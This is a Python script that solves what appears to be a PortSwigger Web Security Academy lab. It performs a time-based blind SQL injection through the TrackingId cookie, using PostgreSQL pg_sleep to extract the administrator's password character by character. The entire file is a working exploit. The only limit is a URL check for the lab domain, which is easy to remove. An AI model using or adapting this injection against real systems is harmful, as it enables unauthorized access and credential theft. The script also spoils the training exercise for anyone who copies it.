import requests
import string
import sys
import time

if len(sys.argv) != 2:
    print("")
    print("usage: python3 death.py <lab_url>")
    print("example: python3 death.py https://0a370067040af8c380b1354700e4006c.web-security-academy.net")
    exit()

lab_url = str(sys.argv[1])

if "web-security-academy" not in lab_url:
    print("wrong lab url.")
    exit()

chars = list(string.ascii_lowercase + string.digits)

password = ""

while True:
    found_char = False

    for char in chars:

        trackingId=f"1'%3b+SELECT+CASE+WHEN+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,{len(password)+1})%3d'{password}{char}'+THEN+pg_sleep(3)+ELSE+pg_sleep+(0)+END--"
        print(f"{password}{char}")

        cookies = {
               'TrackingId': trackingId
        }

        r = requests.get(lab_url, cookies=cookies)

        if r.elapsed.seconds == 3:
            found_char = True
            password+=char
            print(password)
            break

    if not found_char:
        print("username: administrator, password: " + str(password))
        exit()
